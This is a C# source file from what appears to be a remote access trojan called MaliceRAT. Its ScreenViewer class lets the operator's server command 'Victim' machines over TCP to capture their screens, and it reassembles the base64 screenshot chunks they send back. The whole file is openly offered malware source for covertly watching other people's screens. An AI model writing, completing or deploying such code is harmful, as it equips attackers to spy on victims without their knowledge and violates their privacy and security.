using System;
using System.Text;
using System.Web.Script.Serialization;

namespace MaliceRAT.RatServer
{
    public class ScreenViewer
    {
        #region Variables
        private JavaScriptSerializer serializer = new JavaScriptSerializer();
        private StringBuilder screenshotBuilder = new StringBuilder();
        public event Action<byte[]> ScreenshotReceived;
        #endregion

        #region Methods
        public void HandleScreenshotChunk(string data, bool final)
        {
            screenshotBuilder.Append(data);
            if (final)
            {
                byte[] screenshotData = Convert.FromBase64String(screenshotBuilder.ToString());
                screenshotBuilder.Clear();
                ScreenshotReceived?.Invoke(screenshotData);
            }
        }

        public void SetScreenUpdateInterval(Victim client, int interval)
        {
            string message = serializer.Serialize(new { type = "set_interval", interval });
            SendMessageTo(client, message);
        }

        public void RequestScreenshot(Victim client)
        {
            SetScreenUpdateInterval(client, 1000);
            Action<byte[]> handler = null;
            handler = (data) =>
            {
                SetScreenUpdateInterval(client, 0);
                ScreenshotReceived -= handler;
            };
            ScreenshotReceived += handler;
        }

        private void SendMessageTo(Victim client, string message)
        {
            byte[] data = Encoding.UTF8.GetBytes(message);
            client.TcpClient.GetStream().Write(data, 0, data.Length);
        }
        #endregion
    }
}